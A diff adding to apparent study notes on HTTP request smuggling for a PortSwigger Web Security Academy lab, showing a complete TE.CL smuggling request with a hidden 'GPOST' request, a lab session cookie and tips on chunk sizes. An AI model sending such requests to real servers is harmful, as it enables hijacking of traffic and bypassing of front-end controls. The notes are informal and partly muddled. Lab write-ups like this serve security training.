@@ -3882,5 +3882,23 @@ SMUGGLED
 0
 ```
 - The char must be followed by the trailing slash sequence `\r\n\r\n`,Ensure `update content-length` is unchecked
+- Main idea-:
+- Create a chunked requeste.g
+
+```http
+POST / HTTP/1.1
+Host: 0a840084034a88008123fc40002200ab.web-security-academy.net
+Cookie: session=fkJmh9avyVpYemUQDiwdtKtNezdcQOWr
+Content-Length: 3
+Transfer-Encoding: chunked
+
+53
+GPOST / HTTP/1.1
+Host: 0a840084034a88008123fc40002200ab.web-security-academy.net
+
+0
+```
+
+- The main stuff is to ensure that Content-Length should only read transfer-encoding amount of bytes `53`,our content-length will be set to 3 because of the space above it.Then,the next chunk will be interpreted as a new request by the server.Don't forget that 53 is hex encoded.Don't forget to add space after the next smuggled request because it is required in  requests with the Content-Length body.
 
 -------------------
